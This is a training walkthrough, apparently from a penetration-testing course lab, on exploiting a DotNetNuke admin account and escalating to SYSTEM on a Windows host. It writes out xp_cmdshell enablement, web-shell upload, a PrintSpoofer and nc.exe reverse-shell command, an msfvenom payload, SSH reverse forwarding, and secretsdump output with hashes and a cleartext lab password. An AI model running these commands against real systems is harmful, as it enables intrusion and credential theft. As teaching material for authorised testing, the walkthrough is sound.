## Exploitation & Privilege Escalation

At this point, we have moved from the **Information Gathering and Vulnerability Assessment** stages into the **Exploitation stage** of the Penetration Testing Process. After obtaining a foothold, we enumerated what hosts were available to us, scanned for open ports, and probed the accessible services.


### Attacking DNN (DotNetNuke)

Let's head over to DNN and try our luck with the credential pair **Administrator:D0tn31Nuk3R0ck$$@123**. This is a success; we are logged in as the SuperUser administrator account. Here we would want to record another two high-risk findings: **Insecure File Shares and Sensitive Data on File Shares**. We could potentially combine these into one, but it's worth highlighting as separate issues because if the client restricts anonymous access, but all Domain Users can still access the share and see data that is not necessary for their day-to-day work, then there is a still a risk present.


![DNN SQL Console](/Exploitation-and-Privilege-Escalation/images/DNN-sql-console.png) 

A SQL console is accessible under the **Settings** page where we can enable **xp_cmdshell** and run operating system commands. We can first enable this by pasting these lines into the console one by one and clicking **Run Script**. We won't get any output from each command, but no errors typically means it's working.

EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1'
RECONFIGURE

![xp_cmdshell](/Exploitation-and-Privilege-Escalation/images/xp_cmdshell.png) 


If this works, we can run operating system commands in the format **xp_cmdshell '<command here>'**. We could then use this to obtain a reverse shell or work on privilege escalation.

![xp cmdshell](/Exploitation-and-Privilege-Escalation/images/xp_cmdshell-2.png) 

![xp cmdshell](/Exploitation-and-Privilege-Escalation/images/xp_cmdshell-3.png) 


What's also interesting about DNN is we can [change the allowable file extensions](https://dnnsupport.dnnsoftware.com/hc/en-us/articles/360004928653-Allowable-File-Types-and-Extensions-for-Upload) to allow **.asp and .aspx** files to be uploaded. This is useful if we cannot gain RCE via the SQL console. If this is successful, we can upload an ASP web shell and gain remote code execution on the **DEV01** server. The allowed file extensions list can be modified to include .asp and .aspx by browsing to **Settings -> Security -> More -> More Security Settings and adding them under Allowable File Extensions, and clicking the Save button**. Once this is done, we can upload an ASP webshell after browsing to **http://172.16.8.20/admin/file-management**. Click the upload files button and select the ASP web shell we downloaded to our attack host.


Once uploaded, we can right-click on the uploaded file and select **Get URL**. The resultant URL will allow us to run commands via the web shell, where we could then work to get a reverse shell or perform privilege escalation steps, as we'll see next.


![Shell Upload](/Exploitation-and-Privilege-Escalation/images/aspx-shell-upload.png) 


### Privilege Escalation

![whoami /priv](/Exploitation-and-Privilege-Escalation/images/whoami-priv.png) 

Next, we need to escalate privileges. In the command output above, we saw that we have **SeImpersonate privileges**. Following the steps in the [SeImpersonate and SeAssignPrimaryToken](https://academy.hackthebox.com/module/67/section/607) section in the **Windows Privilege Escalation** module, we can work to escalate our privileges to SYSTEM, which will result in an initial foothold in the Active Directory (AD) domain and allow us to begin enumerating AD.


We'll try escalating privileges using the **PrintSpoofer** tool and then see if we can dump any useful credentials from the host's memory or registry. We'll need **nc.exe on the DEV01 host to send ourselves a shell and the PrintSpoofer64.exe binary to leverage SeImpersonate privileges**. There are a few ways we can transfer them up there. We could use the dmz01 host as a "jump host" and transfer our tools through it via SCP and then start a Python3 web server and download them onto the DEV01 host using **certutil**.


An easier way would be to modify the DNN **Allowable File Extensions** once again to allow the **.exe** file format. We can then upload both of these files and confirm via our shell that they are located in **c:\DotNetNuke\Portals\0**.

Once uploaded, we can start a **Netcat** listener on the **dmz01** host and run the following command to obtain a reverse shell as **NT AUTHORITY\SYSTEM**:

	c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"


![Print Spoofer](/Exploitation-and-Privilege-Escalation/images/PrintSpoofer.png) 

We execute the command and get a reverse shell almost instantly.


From here, we can perform some post-exploitation and manually retrieve the contents of the SAM database and with it, the local administrator password hash.


![registry files](/Exploitation-and-Privilege-Escalation/images/reg-files.png) 


Now we can once again modify the allowed file extensions to permit us to down the **.SAVE** files. Next, we can go back to the **File Management** page and download each of the three files to our attack host.


Finally, we can use **secretsdump** to dump the SAM database and retrieve a set of credentials from LSA secrets.

![secretsdump](/Exploitation-and-Privilege-Escalation/images/secretsdump.png) 

	$ secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE                 
	Impacket for Exegol - v0.10.1.dev1+20230909.241.3001b261 - Copyright 2022 Fortra - forked by ThePorgs
		                                                                                              
	[*] Target system bootKey: 0xb3a720652a6fca7e31c1659e3d619944                                      
	[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)                                               
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e20798f695ab0d04bc138b22344cea8:::             
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                     
	DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::            
	WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::        
	mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::             
	[*] Dumping cached domain logon information (domain/username:hash)                                 
	INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc: (2022-06-23 04:59:45)
	[*] Dumping LSA Secrets                                                                            
	[*] $MACHINE.ACC                                                                                   
	$MACHINE.ACC:plain_password_hex:025794ad72a6900a3ef3fe914a4506956b2ad1b99a02553b8b0cb783e489c192bcb30f6b3afe01be33f616c0d1137255f4f9deff12cf3b21e368ed8ad8ef4ff21d0b8bf92754aae785a02016ae38638ba82146f2ef978970571575e0e1b60cb99dc0b645ac15412a03ea31b300f227f516668d44fdddaba9ae2c0d3d9c4979c0235cec33f44676f94b767f88821226008d12c77147bdabcff4494a33c1ff47f0af69940011c6f2ff0e62c94a2f78987ffc21754241c09bb96133a2ff2add5ce0a51de2f96b3f4f1cc3f96fe94bd2d00660186c1cf3fc02700cddf51aedb6b144847e446fc367d1ffe3d40a8335091946
	$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:0f07260f38397035724ab39e3f4fa5c8                    
	[*] DefaultPassword                                                                                
	(Unknown User):Gr8hambino!                                                                         
	[*] DPAPI_SYSTEM                                                                                   
	dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22                                
	dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92                                           
	[*] NL$KM                                                                                          
	 0000   21 0C E6 AC 8B 08 9B 39  97 EA D9 C6 77 DB 10 E6   !......9....w...                        
	 0010   2E B2 53 43 7E B8 06 64  B3 EB 89 B1 DA D1 22 C7   ..SC~..d......".                        
	 0020   11 83 FA 35 DB 57 3E B0  9D 84 59 41 90 18 7A 8D   ...5.W>...YA..z.                        
	 0030   ED C9 1C 26 FF B7 DA 6F  02 C9 2E 18 9D CA 08 2D   ...&...o.......-                        
	NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
	[*] Cleaning up...


We confirm that these credentials work using **CrackMapExec** and we now have a way back to this system should we lose our reverse shell.

![crackmapexec](/Exploitation-and-Privilege-Escalation/images/cme.png) 

From the **secretsdump** output above, we notice a cleartext password, but it's not immediately apparent which user it's for. We could dump LSA again using **CrackMapExec** and confirm that the password is for the **hporter** user.

We now have our first set of domain credentials for the INLANEFREIGHT.LOCAL domain, **hporter:Gr8hambino!**. We can confirm this from our reverse shell on **dmz01**.


### Reverse Port Forwarding / Reverse Proxy


There are many ways to attack this network and achieve the same results, so we will not cover them all here, but one worth mentioning is [Remote/Reverse Port Forwarding with SSH](https://academy.hackthebox.com/module/158/section/1427). Let's say we want to return a reverse shell from the **DEV01** box to our attack host. We can't do this directly since we're not in the same network, but we can leverage **dmz01** to perform reverse port forwarding and achieve our goal. We may want to get a Meterpreter shell on the target or a reverse shell directly for any number of reasons. We could have also performed all of these actions without ever getting a shell, as we could have used **PrintSpoofer** to add a local admin or dump credentials from **DEV01** and then connect to the host in any number of ways from our attack host using **Proxychains (pass-the-hash, RDP, WinRM, etc.)**. See how many ways you can achieve the same task of interacting with the **DEV01** host directly from your attack host. It's essential to be versatile, and this lab network is a great place to practice as many techniques as possible and hone our skills.

> - 1. Let's walk through the reverse port forwarding method quickly. First off, we need to generate a payload using msfvenom. Note that here we'll specify the IP address of the **dmz01** pivot host in the lhost field and NOT our attack host IP as the target would not be able to connect back to us directly.

	$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP of internal pivot host> lport=443 -f exe -o rev-proxy.exe

![meterpreter pivot payload](/Exploitation-and-Privilege-Escalation/images/pivot-host-payload.png) 


> - 2. Next, we need to set up a **multi/handler** and start a listener on a different port than the payload we generated will use.

![pivot listener](/Exploitation-and-Privilege-Escalation/images/pivot-listener.png) 


> - 3. Next, we need to upload the **rev-proxy.exe** reverse shell payload to the **DEV01** target host. We can SCP it up to **dmz01**, start a Python web server on that host and then download the file. Alternatively, we can use the DNN file manager to upload the file as we did previously. With the payload on the target, we need to set up **SSH remote port forwarding** to forward the dmz01 pivot box port **443** to the Metasploit listener port **7000**. The **R** flag tells the pivot host to listen on port **443** and forward all incoming traffic to this port to our Metasploit listener at **0.0.0.0:7000** configured on our attack host.

![pivot payload transfer](/Exploitation-and-Privilege-Escalation/images/dmz-payload-transfer.png) 

![dev01 payload](/Exploitation-and-Privilege-Escalation/images/dev01-payload.png) 


![Remote SSH](/Exploitation-and-Privilege-Escalation/images/remote-ssh.png) 


> - 4. Next, execute the dev01-443.exe payload from the **DEV01** host, and if all goes to plan, we'll get a connection back.

![dev connection](/Exploitation-and-Privilege-Escalation/images/dev01-shell.png) 

A caveat to the above method is that, by default, OpenSSH only allows connection to remote forwarded ports from the server itself (localhost). To allow this, we must edit the **/etc/ssh/sshd_config** file on Ubuntu systems and change the line **GatewayPorts no to GatewayPorts yes**, otherwise we will not be able to get a call back on the port we forwarded in the SSH command (port 443 in our case). To do this, we would need root SSH access to the host we are using to pivot from. At times we will see this configuration set up like this, so it works straight away, but if we don't have root access to the host with the ability to temporarily modify the SSH config file (and reload it to take effect using **service sshd reload**), then we won't be able to perform port forwarding in this way. Keep in mind that this type of change opens up a security hole in the client's system, so you'd want to clear it with them, note down the change, and make every effort to revert it at the end of testing. This [post](https://www.ssh.com/academy/ssh/tunneling/example) is worth reading to understand SSH Remote Forwarding better.  
